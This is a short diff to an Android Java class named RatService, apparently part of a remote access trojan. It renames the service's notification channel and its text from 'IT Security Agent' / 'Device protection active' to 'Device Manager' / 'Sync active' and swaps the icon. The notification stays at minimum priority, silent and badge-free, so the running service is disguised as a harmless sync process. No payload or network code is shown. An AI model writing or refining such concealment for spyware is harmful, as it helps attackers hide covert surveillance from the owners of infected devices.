@@ -212,7 +212,7 @@ public class RatService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "IT Security", NotificationManager.IMPORTANCE_MIN);
+                    CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_MIN);
             ch.setSound(null, null);
             ch.setShowBadge(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
@@ -222,9 +222,9 @@ public class RatService extends Service {
 
     private Notification buildNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("IT Security Agent")
-                .setContentText("Device protection active")
-                .setSmallIcon(android.R.drawable.ic_lock_lock)
+                .setContentTitle("Device Manager")
+                .setContentText("Sync active")
+                .setSmallIcon(android.R.drawable.ic_popup_sync)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setSilent(true)
                 .build();
